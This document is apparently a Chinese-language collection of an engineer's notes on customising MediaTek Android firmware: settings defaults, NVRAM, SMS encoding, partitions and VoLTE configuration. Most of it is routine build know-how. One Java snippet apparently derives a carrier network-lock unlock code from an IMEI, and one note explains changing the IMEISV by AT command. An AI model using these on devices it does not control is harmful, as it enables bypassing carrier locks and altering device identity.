进入ProjectConfig.mk文件后，搜索CUSTOM_KERNEL_GYROSCOPE即可，如何后面没有写东西，就是不支持，反之，亦然
```

## 关于modem mak文件的命名长度问题--不要超过38个字符，否则手机链接cat抓取log会出现log挂掉的情况

## [默认值] IMEISV的修改   [FAQ02072] 关于IMEI、IMEISV、SVN

```text
IMEI(International Mobile Equipment Identity)是国际移动设备身份码的缩写，固化于手机中，每个手机的IMEI应该是唯一、不变的。
IMEI码由GSM（全球移动通信协会）统一分配，授权BABT（英国通信认证管理委员会）审受。
2004年以前的标准中，IMEI共15位（取值必须是0~9的数字），依次分别是6位TAC、2位FAC、6位SNR、1位CD校验位。
2004年以后的标准中删去了最后的1位CD校验位，新加入了2位SVN(software version number)，故称IMEISV，共16位（取值仍必须是0~9的数字）。
SVN的取值也必须是0~9的数字，而且99这个值是被保留的。
网络检查的时候会指明检查IMEI还是IMEISV，如果是检查IMEI，则手机许上报前14位IMEI（1位CD校验位不上报），如果是检查IMEISV，则手机上报16位IMEISV
1、IMEI SV 的修改，可以通过AT COMMAND ：AT+EGMR=1,9,”00”;
2、在modem端修改，custom/service/nvram/nvram_data_items.c文件中的
SYS_CACHE_ENTRY(NVRAM_SYS_SVN,
            NVRAM_APP_RESERVED,
            KAL_FALSE,
            "NVRAM_SYS_SVN",
            0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
```

## ro.product.device以及ro.product.name里面不可以有非法字符（如"."）,会导致google的play store连接不上

## [FAQ13432]  [Dialer] 如何使拨号盘搜索支持葡萄牙文?     <http://unicode-table.com/cn/#control-character>

```text
packages/providers/ContactsProvider/src/com/android/providers/contacts/HanziToPinyin.java中添加的
static {
    sMuiSupportMap.put('\u00c0', '2'); //   -->'\u00c0'这个unicode对应的字符可以用2搜索出来
    sMuiSupportMap.put('\u00c0', 'a'); //   -->'\u00c0'这个unicode对应的字符可以用a搜索出来

    sMuiSupportMap.put('\u00e3', 'a'); //ã
    sMuiSupportMap.put('\u00e2', 'a'); //â
    sMuiSupportMap.put('\u00e1', 'A'); //Á
    sMuiSupportMap.put('\u00c3', 'A'); //Ã
    sMuiSupportMap.put('\u00c0', 'A'); //À
    sMuiSupportMap.put('\u00c2', 'A'); //Â

    sMuiSupportMap.put('\u00e9', 'e'); //é 
    sMuiSupportMap.put('\u00ea', 'e'); //ê
    sMuiSupportMap.put('\u00e8', 'e'); //è
    sMuiSupportMap.put('\u00eb', 'e'); //ë

    sMuiSupportMap.put('\u00ed', 'i'); // í
    sMuiSupportMap.put('\u00ec', 'i'); // ì
    sMuiSupportMap.put('\u00ee', 'i'); // î
    sMuiSupportMap.put('\u00ef', 'i'); // ï

    sMuiSupportMap.put('\u00f5', 'o'); // õ
    sMuiSupportMap.put('\u00f4', 'o'); //ô
    sMuiSupportMap.put('\u00f3', 'o'); //ó
    sMuiSupportMap.put('\u00f2', 'o'); //ò

    sMuiSupportMap.put('\u00e7', 'c'); // ç

    sMuiSupportMap.put('\u00fa', 'u'); //ú
    sMuiSupportMap.put('\u00f9', 'u'); //ù
    sMuiSupportMap.put('\u00fb', 'u'); //û
    sMuiSupportMap.put('\u00fc', 'u'); //ü

    sMuiSupportMap.put('\u00ff', 'y'); //ÿ
}
具体所有的特殊字符的对应unicode值，可以看/home/jiangcunbin/Desktop/sagereal资料/自己总结/特殊字符unicode值 该文件
```

## 预置联系人的名字修改在

```text
packages/apps/Contacts/src/com/mediatek/contacts/simservice/PresetContactsImportProcessor.java中的INSERT_PRESET_NAME[] 
问题点：如果在恢复出厂设置后预置联系人去写入数据库时断电，就会出现预置联系人只写入一部分，这时候去重启的时候，代码端检测到预置联系人数据库已经有值（不会去管你是否完全写入），这就导致预置联系人一直丢失一部分，这时候就需要一些保护措施。
修改方法：packages/apps/Contacts/src/com/mediatek/contacts/simservice/PresetContactsImportProcessor.java文件中contactCursor != null && contactCursor.getCount() > 0下面的return修改为continue；packages/apps/Contacts/src/com/mediatek/contacts/simservice/PresetContactsImportProcessorOrange.java文件中contactCursor != null && contactCursor.getCount() > 0下面的return修改为continue；
```

## 如何关闭小区广播（Cell Broadcast）

```text
在modem端修改，custom/service/nvram/nvram_cust_pack.c文件中COMMON_NVRAM_EF_SMSAL_COMMON_PARAM_DEFAULT[] 项中
#if defined (__CB_SETTING_OFF__)  //redmine 36063 CB setting modify by shiyujiao 2015-07-23 begin
    0x00, 0x01,              -->关闭小区广播
#else
    0x01, 0x01,              -->打开小区广播
#endif
ps:有时候在modem端关闭小区广播后，发现插卡后刚进去是关闭的，过段时间进去就出现又打开的状态，这是去看下MTK_ETWS_SUPPORT是否关闭
```

## 当使用startActivityForResult()时，去启动一个acitivity的时候，前面千万不能有 Intent.FLAG_ACTIVITY_NEW_TASK 和 Intent.FLAG_ACTIVITY_SINGLE_TOP，且被启动的apk

```text
在androidManifest.xml文件中不可以有android:launchMode="singleInstance"，只能是默认的（也就是launchMode是standard模式），不然的话，会出现startActivityForResult()运行后，还没等到被调用的 Activity 返回，onActivityResult() 就被执行了，且返回的RESULT_CANCELED
还有一种情况：startActivityForResult(intent, 0);是第二个参数的问题，该参数必须大于0才能在返回值，并激活onActivityResult方法。
ps：也就是onActivityResult要这个有用被启动的activity只能是standard模式
```

## [MMS]  [7bit] 短信编码方式(bit是位，byte是字节，1byte = 8bit)，短信最多输入140个字节（byte）

```text
1、GSM编码 --> 7bit -->1个字节-->主要用来发送ASCII字符 --> 有abc、ABC、123、@主要是这四种类型的可以通过GSM编码发送
2、UCS2编码 --> 16bit -->2个字节-->主要用来发送Unicode字符 -->除了ASCII字符，还加上了很多国家的语言，比如汉字，所以短信发汉字用的是2个字节
1.GSM alphabet  表示用户编辑的短信内容都用7bit进行编码
如果输入的都为ASCII字符，则最多可以输入的字符数为140x8(每个字节为8位)/7(该编码方式为7位)=160，但是如果输入中存在Unicode字符，则按照Unicode的编码方式进行编码，则最多可以输入的字符数为140x8(每个字节为8位)/16(Unicode编码方式为16位)=70
2.Unicode    表示用户编辑的短信内容都用ucs2进行编码
不管输入的是ASCII字符还是Unicode字符，都是按照16位的进行计算，则最多可以输入的字符数为140x8(每个字节为8位)/16(Unicode编码方式为16位)=70
3.Automatic  先用7bit进行编码，如果有些字符无法用7bit编码（有些字符并没有在编码表里面定义），则用ucs2进行编码
如果输入的都为ASCII字符，则最多可以输入的字符数为140x8(没个字节为8位)/7(该编码方式为7位)=160，但是如果输入中存在Unicode字符，则按照Unicode的编码方式进行编码，则最多可以输入的字符数为140x8(没个字节为8位)/16(Unicode编码方式为16位)=70     （同GSM alphabet的编码方式）
由于默认的GSM alphabet和Automatic的编码方式相同，所以很多客户要求我们在选择GSM alphabet编码方式时，直接[FAQ10993] SMS内容强制用7bit编码[Orange operator] ，当你输入Unicode字符时，发送出去的时候直接用“?”代替，而“?”就是ASCII字符，所以此时选择该编码方式，最多可以输入的字符数为140x8(没个字节为8位)/7(该编码方式为7位)=160
```

## [MMS]  [7bit] 如何实现短信编码方式（M平台上）

```text
[FAQ10993] SMS内容强制用7bit编码[Orange operator] 
[FAQ09191] 信息设置里增加让用户选择短信编码方式的菜单    ----> 里面有修改默认值的方法
vendor/mediatek/proprietary/packages/apps/Mms/src/com/android/mms/transaction/SmsSingleRecipientSender.java文件中sendMessage方法加上
SharedPreferences pref = mContext.getSharedPreferences("com.android.mms_preferences", Context.MODE_WORLD_READABLE);
String inputString = pref.getString("pref_key_sms_input_mode", "GSM alphabet");

if ("GSM alphabet".equals(inputString)) {
    mMessageText=mMessageText.replaceAll("ą","a");
    mMessageText=mMessageText.replaceAll("ā","a");
    mMessageText=mMessageText.replaceAll("á","a");
    mMessageText=mMessageText.replaceAll("â","a");
    mMessageText=mMessageText.replaceAll("ã","a");

    mMessageText=mMessageText.replaceAll("Ą","A");
    mMessageText=mMessageText.replaceAll("Ā","A");
    mMessageText=mMessageText.replaceAll("Á","A");
    mMessageText=mMessageText.replaceAll("À","A");
    mMessageText=mMessageText.replaceAll("Â","A");
    mMessageText=mMessageText.replaceAll("Ã","A");

    mMessageText=mMessageText.replaceAll("č","c");
    mMessageText=mMessageText.replaceAll("ç","c");
    mMessageText=mMessageText.replaceAll("ć","c");

    mMessageText=mMessageText.replaceAll("Č","C"); 
    mMessageText=mMessageText.replaceAll("Ć","C");

    mMessageText=mMessageText.replaceAll("ê","e");
    mMessageText=mMessageText.replaceAll("ë","e");
    mMessageText=mMessageText.replaceAll("ė","e");
    mMessageText=mMessageText.replaceAll("ę","e");
    mMessageText=mMessageText.replaceAll("ē","e");

    mMessageText=mMessageText.replaceAll("È","E");
    mMessageText=mMessageText.replaceAll("Ê","E");
    mMessageText=mMessageText.replaceAll("Ë","E");
    mMessageText=mMessageText.replaceAll("Ė","E");
    mMessageText=mMessageText.replaceAll("Ę","E"); 
    mMessageText=mMessageText.replaceAll("Ē","E");

    mMessageText=mMessageText.replaceAll("î","i");
    mMessageText=mMessageText.replaceAll("ï","i");
    mMessageText=mMessageText.replaceAll("ī","i");
    mMessageText=mMessageText.replaceAll("į","i");
    mMessageText=mMessageText.replaceAll("í","i");

    mMessageText=mMessageText.replaceAll("Ï","I");
    mMessageText=mMessageText.replaceAll("Î","I");
    mMessageText=mMessageText.replaceAll("Ī","I");
    mMessageText=mMessageText.replaceAll("Į","I");
    mMessageText=mMessageText.replaceAll("Ì","I");
    mMessageText=mMessageText.replaceAll("Í","I");

    mMessageText=mMessageText.replaceAll("ô","o");
    mMessageText=mMessageText.replaceAll("õ","o");
    mMessageText=mMessageText.replaceAll("ó","o");
    mMessageText=mMessageText.replaceAll("ō","o");

    mMessageText=mMessageText.replaceAll("Ô","O");
    mMessageText=mMessageText.replaceAll("Õ","O");
    mMessageText=mMessageText.replaceAll("Ò","O");
    mMessageText=mMessageText.replaceAll("Ó","O");
    mMessageText=mMessageText.replaceAll("Ō","O");

    mMessageText=mMessageText.replaceAll("û","u");
    mMessageText=mMessageText.replaceAll("ū","u");
    mMessageText=mMessageText.replaceAll("ú","u");

    mMessageText=mMessageText.replaceAll("Û","U");
    mMessageText=mMessageText.replaceAll("Ù","U");
    mMessageText=mMessageText.replaceAll("Ū","U");
    mMessageText=mMessageText.replaceAll("Ú","U");

    mMessageText=mMessageText.replaceAll("Ń","N");
    mMessageText=mMessageText.replaceAll("ń","n");

    mMessageText=mMessageText.replaceAll("Ÿ","Y");
    mMessageText=mMessageText.replaceAll("ÿ","y");

    mMessageText=mMessageText.replaceAll("Œ","OE");

    mMessageText=mMessageText.replaceAll("œ","oe");

    mMessageText=mMessageText.replaceAll("ž","z");
    mMessageText=mMessageText.replaceAll("ż","z");
    mMessageText=mMessageText.replaceAll("ź","z");
    mMessageText=mMessageText.replaceAll("Ž","Z");
    mMessageText=mMessageText.replaceAll("Ż","Z");
    mMessageText=mMessageText.replaceAll("Ź","Z");

    mMessageText=mMessageText.replaceAll("š","s");
    mMessageText=mMessageText.replaceAll("ś","s");
    mMessageText=mMessageText.replaceAll("Š","S");
    mMessageText=mMessageText.replaceAll("Ś","S");

    mMessageText=mMessageText.replaceAll("Ł","L");
    mMessageText=mMessageText.replaceAll("ł","l");
}
int codingType;
if ("GSM alphabet".equals(inputString)) {
    codingType = SmsMessage.ENCODING_7BIT;
}else{
    codingType = SmsMessage.ENCODING_UNKNOWN;
}
```

## 64位系统环境下，在eng版本中预置32位apk可以运行，在user版本中预置的32位apk运行报错?

```text
原因：
1、User版本的32位apk在64位系统环境下编译时，默认被编译解析为64位路径。当运行时找不到其32位的默认路径，报错。在Android.mk文件中加入LOCAL_MULTILIB := 32，可以编译解析为32位路径，运行不报错。
2、Eng版本没有32位和64位区分，运行不报错
```

## [默认值] 默认时间修改

```text
72L：
alps/vendor/mediatek/proprietary/frameworks/base/res/res/values/config.xml  修改default_restore_year值

alps/frameworks/base/services/core/java/com/android/server/NetworkTimeUpdateService.java
//today.set(1, 8, mDefaultYear);
修改日月，第一位是日，从1开始，第二位是月，从0开始，即1，8代表9月1日，1月1日需要使用//today.set(1, 0, mDefaultYear);

alps/kernel-3.10/arch/arm/mach-mt6572/sr6572_wet_l/rtc/rtc-mt.h
alps/bootable/bootloader/lk/target/sr6572_wet_l/include/target/cust_rtc.h
alps/bootable/bootloader/preloader/custom/sr6572_wet_l/inc/cust_rtc.h
修改年月日，都是从1开始计数

其他平台稍微有点变化，目前设定为2016-01-01会出现夏令时变为2015-12-31的情况；
但是有些客户就是希望2016-01-01，因此出现夏令时情况的再单独与客户launcher沟通修改成其他时间；

53L:alps/vendor/mediatek/proprietary/frameworks/base/res/res/values/config.xml  修改default_restore_year值
alps/frameworks/base/services/core/java/com/android/server/NetworkTimeUpdateService.java
//today.set(1, 8, mDefaultYear);
修改日月，第一位是日，从1开始，第二位是月，从0开始，即1，8代表9月1日，1月1日需要使用//today.set(1, 0, mDefaultYear);

/kernel-3.10/drivers/misc/mediatek/mach/mt6735/sr6735_65c_l1/rtc/rtc-mt.h 
/bootable/bootloader/preloader/custom/sr6735_65c_l1/inc/cust_rtc.h

kk：
alps/vendor/mediatek/proprietary/frameworks/base/res/res/values/config.xml  修改default_restore_year值

alps/frameworks/base/services/core/java/com/android/server/NetworkTimeUpdateService.java
//today.set(1, 8, mDefaultYear);
修改日月，第一位是日，从1开始，第二位是月，从0开始，即1，8代表9月1日，1月1日需要使用//today.set(1, 0, mDefaultYear);
M:mediatek/custom/up40_h405f_sfr/kernel/rtc/rtc/rtc-mt.h
M:mediatek/custom/up40_h405f_sfr/kernel/rtc/rtc/rtc-mt6575.h
M:mediatek/custom/up40_h405f_sfr/preloader/inc/cust_rtc.h
在以上三个文件中修改即可
```

## 新建联系人时，把某些特殊的字母写入作为联系人的名字，保存后名字会变成保存的号码，即名字不会保存（redmine 62148）

```text
[FAQ08018] 系统语言为英语时，Contacts联系人名字含有特殊前缀后缀(Dr. Mr. Lt等)时的相关问题处理
```

## SIM卡相关问题

```text
1、[FAQ02891]  [SIM] 什么情况下显示Invalid SIM     Invalid SIM 表示注册网络，被网络reject.
2、[FAQ17655] SIM卡联系人无法收藏
3、[FAQ18208]  [SAT] 如何不显示开机SIM卡欢迎语
4、[FAQ14489] Android L SIM卡更新语言问题
```

## [分区] 修改分区

```text
如何在L、M、GO/O项目中修改分区
L、M：先进入projectConfig.mk文件中搜索sagereal_fat_config，如果后面有值就修改../sagereal/custom/fatconfig/SYSTEM2000M（sagereal_fat_config对应值命名）/partition_table_MT6580.xls；如果没有值就修改/device/mediatek/build/build/tools/ptgen/MT6580/partition_table_MT6580.xls

GO/O：alps/device/mediatekprojects/$project/BoardConfig.mk中设定：
BOARD_MTK_SYSTEM_SIZE_KB := 1024000
BOARD_MTK_VENDOR_SIZE_KB := 307200
BOARD_MTK_CACHE_SIZE_KB := 114688
```

## Tethering IPV4/IPV6相关

```text
[FAQ08793] "Hotspot & tethering settings"的预设值IPv4,如何将它的預設值改為"IPv4 & IPv6"
[FAQ08603]  [Dialup] 测试IPv6拨号失败
[FAQ15542] IPv6 tethering feature项介绍及通用配置
[FAQ13289]  [PAN]  [KK] 网络共享与便携式热点设置”设为“IPv4&IPv6”，无法共享网络
[FAQ11563] 请问平台是否支持IPv6?请帮忙确认IPv6相关需求是否支持?
[FAQ15292] IPv4 or IPv6 Prefer       如果同时拥有IPv4和IPv6的地址，是会默认优先上报IPv6的地址，若需要修改为IPv4 prefer，可以按如下方式修改
```

## [FAQ11564] 长按Home键唤起Google Now

```text
1. 修改 frameworks/base/core/res/res/values/config.xml
<integer name="config_longPressOnHomeBehavior">2</integer>
注：这里的值可以设置三个
1代表唤起recent app界面；
2代表唤起搜索界面（Google Now)；
3代表Nothing
```

## [OTA]  [NVRAM] 通过fota升级一些nvram，必须修改lid的值

```text
1、锁网的lid是在modem端的interface/service/nvram/nvram_editor_data_item.h文件中的NVRAM_EF_SML_LID_VERNO
2、音频参数的lid是在mediatek/custom/up16_h502s_meo/cgen/inc/Custom_NvRam_LID.h文件中的AP_CFG_RDCL_FILE_AUDIO_LID_VERNO值(kk)
vendor/mediatek/proprietary/custom/sr6580_weg_l/cgen/inc/Custom_NvRam_LID.h文件中的AP_CFG_RDCL_FILE_AUDIO_LID_VERNO值(L)
PS:[FAQ14500]  [Audio Common]  OTA升级音频参数后如果不恢复工厂设置也能生效
3、小区广播的lid是在interface/service/nvram/nvram_editor_data_item.h文件中的NVRAM_EF_CB_CH_INFO_LID_VERNO
4、IMEISV的lid是在interface/service/nvram/nvram_editor_data_item.h文件中的NVRAM_EF_IMEI_IMEISV_LID_VERNO
```

## [锁网] 通过IMEI算锁网解锁码

```text Java
String imeiCode = "354648020000251";
for (int i = 0; i < 8; i++) {
    int sum = 0;
    for (int k = 0 ; k < 8; k++) {
     sum += Integer.parseInt(imeiCode.charAt(i + k) + "");
    }
    System.out.print(sum % 10);
}
```

## 开机向导引起灭屏时间问题

```text
文档位置/home/jiangcunbin/Desktop/sagereal资料/自己总结/GMS认证/GMS包引起问题分析_new/开机向导引起灭屏时间问题.txt
开机向导正常整个过程就是 60000->121000->60000，在开机向导界面拔掉电池，这个行为是第二次时把121000->60000这个过程破坏了。导致开机向导没能把这个值修改回来。
而我们的修改方式就是把60000->121000这个过程就不让走。这样自然就不会把这个时间给修改了。修改文件在frameworks/base/packages/settingsprovider/src/com/android/providers/settings/SettingsProvider.java文件中的isRedundantSetValue方法中加上
if (name.equals("screen_off_timeout")&&value.equals("121000")) {
    return true;
}
```

## [默认值]  [log] 如何让user的也默认打开mtklog

```text
L：alps/vendor/mediatek/proprietary/external/xlog/tools/mtklog-config-user.prop
M/N：alps/device/mediatek/common/mtklog/mtklog-config-bsp-user.prop
把这两个文件中的值都改为true
```

## 开机向导wifi skip置灰

```text
sagereal资料/自己总结/GMS认证/GMS包引起问题分析_new/FAQ18056.pdf
5.1_r3版本,按钮置灰一段时间后可以恢复,点击即可跳过  -->  主要因为GmsCore的3个dex文件做dex2oat时间太长导致,由于手机防盗功能,开机向导在wifi设置界面需要判断FRP的状态来决定是否一定需要网络来登录Google账户验证,FRP状态需要通过GmsCore的FrpService获取,而FrpService需要等待GmsCore的3个插件dex文件做dex2oat完成后才能启动.如果在开机向导的wifi设置界面,FrpService还没有启动起来,那么这个时候skip按钮就是置灰的;需要一直等待FrpService启动后获取到正确的FRP状态后skip按钮才可以点击
6.0_r2版本,按钮置灰不能恢复,则此次开机一直不能跳过  -->   M版本GmsCore第一次运行时并不需要再做dex2oat,可是SetupWizard的机制有所变化,即:SetupWizard通过asyncTask调用GmsCore获取FRP Status,如果10s未返回结果则cancel掉此asyncTask(通过中断线程执行直接cancel,同时抛出InterruptedException异常),且设置必须要网络连接才可以进行下一步
对于性能不够好的机器,10s有可能线程未能及时finished,则会导致开机向导状态错误

ps：当打开数据流量的时候，不会按照上面描述的去走，会去连接google的服务器；当没有打开数据流量的时候，会通过上面的描述去走
```

## [log] Play Store 无法连接 log 分析

```text
10-08 14:00:04.374197: E/CheckinTask(1063): Checkin failed: https://android.clients.google.com/checkin (request #0): java.io.IOException: Rejected response from server: invalid hardware identifier: "Andy5.5EI" is not a valid device
从log中可以明确的知道Andy5.5EI这个名字是不被play store认可的，所以ro.product.device以及ro.product.name两个值是不能带有空格或“.”这样的字符
```

## [bt] 手机可以通过蓝牙发送flac格式的音频文件，但不能接收（redmine57636）

```text
packages/apps/Bluetooth/src/com/android/bluetooth/opp/Constants.java 文件中 ACCEPTABLE_SHARE_INBOUND_TYPES 中加上 application/x-flac
```

## 如何把window里面的txt文件转换为linux系统下的文件（不转换会显示乱码）

```text bash
iconv -f gb18030 -t utf8 file1 -o file2
```

## [默认值]  [bug] (名称)WIFI直连名称显示错误

```text
kk：frameworks/base/wifi/java/android/net/wifi/p2p/WifiP2pService.java 文件中的 getPersistedDeviceName() 方法
L：frameworks/opt/net/wifi/service/java/com/android/server/wifi/p2p/WifiP2pServiceImpl.java文件中的
```

## [默认值]  [FAQ04794] 如何修改默认数据连接开关(前提是数据库的默认值loadSetting(stmt, Settings.Global.MOBILE_DATA要修改好)

```text
L(单卡)：frameworks/opt/telephony/src/java/com/mediatek/internal/telephony/dataconnection/DataSubSelector.java文件subSelectorForOm(Intent intent)方法中
turnOffNewSimData(intent);  -->运行后关闭，不运行就是打开

L(双卡)：把上面的修改后在修改后面的
frameworks/opt/telephony/src/java/com/android/internal/telephony/dataconnection/DcTrackerBase.java文件handleMobileDataSettingNotFound()方法中
Settings.Global.putInt(mResolver, Settings.Global.MOBILE_DATA + phoneSubId, 0);-->关闭
Settings.Global.putInt(mResolver, Settings.Global.MOBILE_DATA + phoneSubId, 1);-->打开
```

## [默认值]  [bt] 修改蓝牙显示名称

```text
KK:
mediatek/config/up39_h455_coppel/custom.conf 文件中 bluetooth.HostName 中

L之后:
/home/zq/projects/Project_common/alps/device/mediatek/common/custom.conf 目前都在 ProjectConfig.mk 中用宏 bluetooth_hostname 控制
```

## [默认值] 如何让每个apk里面的menu通过三个点的菜单按钮显示出来

```text
frameworks/base/core/res/res/values/config.xml 文件中的 <integer name="config_overrideHasPermanentMenuKey">0</integer> 值改为2

frameworks/base/core/java/com/android/internal/view/ActionBarPolicy.java
public boolean showsOverflowMenuButton() {
    return !ViewConfiguration.get(mContext).hasPermanentMenuKey();  //通过 config_overrideHasPermanentMenuKey 来控制三个点的菜单按钮是否显示
}
```

## [默认值]  [FAQ04312] 如何修改默认字体大小 Settings-->Display-->Font size

```text
L:frameworks/base/core/java/android/content/res/Configuration.java 中的 setToDefaults() 方法中的 fontScale 值，1.0f 为 normal，0.9f 是 small
Android系统中在Settings->Display->Font Size设置系统字体大小，默认的系统字体大小为普通(Normal)，如果修改默认值，可以在下面这个文件中进行修改：
在alps/frameworks/base/core/java/android/content/res/Configuration.java文件中如下
public void setToDefaults() 这个方法中进行修改，
如:把默认字体要改为超大，把fontScale值改为1.15f，然后重新build framework.jar这个模块即可；
public void setToDefaults() {
fontScale = 1.15f;  //normal value is 1
mcc = mnc = 0;

注意：Settings中系统的字体大小，在/packages/apps/Settings/res/values/arrays.xml文件中的”entryvalues_font_size”这个tag中定义
Small:0.9
Normal:1.0
Large:1.1
Extra Large:1.15

fontScale值必须是上述中的一个。

N版本上默认字体大小修改如下：
（1）将/frameworks/base/core/java/android/provider/Settings.java文件中的 DEFAULT_FONT_SCALE 修改为所需要设置的值。
（2）将/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsHelper.java文件中如下位置的1.0f，修改为所需要的值。
case Settings.System.FONT_SCALE:
return Settings.System.getFloat(mContext.getContentResolver(), name, 1.0f) != 1.0f;

字体大小值 entryvalues_font_size 的定义，在N版本上 packages/apps/Settings/res/values/arrays.xml 文件中定义如下：
<string-array name="entryvalues_font_size" translatable="false">
    <item>0.85</item>
    <item>1.0</item>
    <item>1.15</item>
    <item>1.30</item>
</string-array>

在设置所需的字体大小时请参考 entryvalues_font_size 的定义。

通过 adb 命令设置字体的大小 adb shell settings put system font_scale 1.0
```

## [FAQ12292]  [browser] 浏览器下载文件无法打开

```text
浏览器下载文件时，有时会遇到下载后文件无法打开，比如ogg，3gp等格式，或者下载的apk无法安装等问题。这类问题一般是server返回的mimetype有问题，导致打开时，发往其他app的Intent不能被正常处理。例如无法安装apk文件，一般通过搜索关键字"DownloadManager",会搜到类似如下的log:

06-27 14:20:15.364   919   919 W DownloadManager: Failed to start Intent { act=android.intent.action.VIEW dat=content://downloads/all_downloads/9 typ=application/octet-stream flg=0x3 }: android.content.ActivityNotFoundException: No Activity found to handle Intent { act=android.intent.action.VIEW dat=content://downloads/all_downloads/9 typ=application/octet-stream flg=0x3 }

从log信息可以看出：mime typ=application/octet-stream 不能被处理。
主要原因是：下载apk时，server返回application/octet-stream,不是标准的mimetype: application/vnd.android.package-archive,
导致htmlviewer无法打开该inent. 这类一般是server issue，若server返回的是标准的：application/vnd.android.package-archive就不会有
这样的问题.

[SOLUTION] 
先确认无法打开文件的正确mime type，然后在DownloadHandler.java中的DownloadStartNoStream()作特殊处理。将sever返回错误的mime强
制修正成正确的mime type即可。下面给出以无法打开apk为例的修改方案，同理，其他格式的文件也是类似的。
修改文件：\packages\apps\Browser\src\com\android\browser\DownloadHandler.java
修改方法：onDownloadStartNoStream()

具体修改：
public static void onDownloadStartNoStream(Activity activity, String url, String userAgent, String contentDisposition, String mimetype, String referer, boolean privateBrowsing, long contentLength) {
    String filename = URLUtil.guessFileName(url, contentDisposition, mimetype); 
    Xlog.d(XLOGTAG, "Guess file name is: " + filename + " mimetype is: " + mimetype);

    // modify start:   change Mime for apk
    if (filename.endsWith(".apk") && mimetype.equal("application/octet-stream")) {
        mimetype = "application/vnd.android.package-archive";
    }
    // modify end
}
```

## [init.rc] M或者L项目的init.rc文件路径

```text
alps/device/mediatek/mt6580/init.mt6580.rc
```

## 如果开机向导结束后到launcher起来之间有黑屏出现该怎么办?

```text
去除Provision这个apk，sagereal_remove_apps=Provision ?? 这个不能移除吧??
```

## 3G/2G preferred 和 3G/2G auto 的区别

```text
3g/2g preferred这个模式是指3g优先，就是说只要有3g的网络，哪怕3g的信号很差，手机也会挂载到3g的，如非3g的信号一点都没有了，才会跳转到2g的；3g/2g auto这个模式是指当3g的网络信号差的时候，会自动的切换到2g去
```

## [string] ICU相关

```text
很多字符串翻译的都在icu资源中，在external/icu/icu4c
[FAQ04011] 如何编译ICU资源，按照编译出来后，可以直接进入adb shell --> cd system/usr/icu中，用 external/icu/icu4c/source/data/out/tmp/icudt55l.dat把替换掉
```

## 有些项目工厂测试中imei和imsi都为null

```text
把
TelephonyManagerEx tm = TelephonyManagerEx.getDefault();
修改为
TelephonyManager tm1 = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
```

## [FAQ05658] 手机解锁后，如果用户未处理未读信息/未接电话等notification，如何使指示灯继续闪烁

```text
当M平台上时，除了要注释掉文档里面的那句话以外，如果要求亮屏的时候也会闪烁的话，要在frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java文件中的updateLightsLocked()方法中注释掉mScreenOn的判断
```

## [FAQ07381]  [Aduio Common] APP层如何控制loopback开启或关闭

```text
AudioManager audiomanager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
audiomanager.setParameters("SET_LOOPBACK_TYPE=1,3");
其中中传入的两个参数意义如下：
第一个参数表示input device，1，2，3分别代码main mic，耳机mic，sub mic(dual mic项目才有效)
第二个参数表示output device，1，2，3分别表示听筒，耳机，喇叭
根据需要进行组合即可
closeMic = "SET_LOOPBACK_TYPE=0"  --> 代表关闭对应的通路
```

## 如何让紧急拨号后显示在call history(通话记录)里面

```text
M：packages/services/Telecomm/res/values/config.xml文件中修改allow_emergency_numbers_in_call_log即可
N：frameworks/base/telephony/java/android/telephony/CarrierConfigManager.java文件中把sDefaults.putBoolean(KEY_ALLOW_EMERGENCY_NUMBERS_IN_CALL_LOG_BOOL, false)修改为sDefaults.putBoolean(KEY_ALLOW_EMERGENCY_NUMBERS_IN_CALL_LOG_BOOL, true)。
```

## 如何修改开机过程中的黑屏问题

```text
eservice：ALPS02795990
[FAQ18016] L/M版本开机黑屏问题区分

1、L版本开机时，kernel logo与开机动画之间闪一帧黑屏，这个现在在kernel logo与开机动画相同并且开机动画是静态的时候表现的尤其明显,目前主要体现在455 digicel和5012 digicel项目上！-------> [FAQ14488] kernel logo到开机动画之间闪现黑屏（L）----> 这个现象是因为，在BootAnimation开始绘图之前，会先做一次clear screen的动作，避免出现前面的图干扰到BootAnimation的显示。这是Google default design，虽然不可避免，但是可以优化。
ps：在该FAQ上有很多修改的点，但是 目前我们基本上是使用的bool BootAnimation::movie()函数，之后如需修改可修改在bool BootAnimation::movie()中。

2、N项目上，（1）开机动画结束后，概率性闪现灰屏  （2）刷机后开机到语言界面时，有灰屏出现，这些在N上的项目是正常的，原因如下：   redmine86991
Google在N上新增了Direct boot（file base encryption）feature，为了配合这个feature，定义了开机过程中的一个状态：user_unlocked, 指用户设置了锁屏，重启/开机第一次解锁（即使没有设置锁屏，也会经过user_unlocked的状态）。在user unlocked之前，只有定义了 encryption-aware=true的组件能被叫起，Launcher没有定义这个flag，所以无法被PMS查询到，AMS无法先启动Launcher；Fallbackhome有定义这个flag，即使优先级是-1000，但是PMS只能找到这个activity响应HOME intent，所以会先启动Fallbackhome。
Google设计Fallbackhome的主要原因就是在user unlocked之前，必须至少要有个activity响应HOME intent，比如Launcher没有定义encryption aware，那么就需要Fallbackhome先起来。目前平台还没有找到比较根本的解决办法，google在MR1上也有增加一个patch来改善，但是也是治标不治本，用一个processing的dialog来缓解黑屏的体验，但是仍然会有黑屏。
```

## [VOLTE] 如何配置VOLTE

```text
首先要向mtk申请相应的patch，然后要对其进行配置，那么如何配置呢?
1、进入online，然后 MediaTek On-Line> Quick Start> IMS功能专区(VoLTE/VoWifi/ViLTE)，在该功能专区可知，（1）如果你只要弄一个运营商的话，可以看里面的IMS Configuration,对应的可以SBP ID在可在[FAQ17597] 各运营商IMS feature参数配置查看；（2）如果你要配置多个运营商能自由切换的话，可以看Dynamic SBP(D-SBP),在该项最下面有如何配置的分析
How to Enable DSBP

Under device/mediatek path
[Project_Name] /ProjectConfig.mk, e.g. k55v1_64_om_lwg_volte_ss/ProjectConfig.mk
Set MTK_IMS_SUPPORT = yes             --->37M上默认打开
Set MTK_VOLTE_SUPPORT = yes           --->37M上默认打开
Set MTK_DYNAMIC_SBP_SUPPORT = yes
Set MTK_MD_SBP_CUSTOM_VALUE = 0
Set OPTR_SPEC_SEG_DEF = NONE       -----> 同时要检查persist.operator.optr也要为空

Under kernel-3.xx/arch/arm64/configs path
[Project_Name] _defconfig, e.g. k55v1_64_om_lwg_volte_ss_defconfig
Set CONFIG_MTK_MD_SBP_CUSTOM_VALUE = "0"

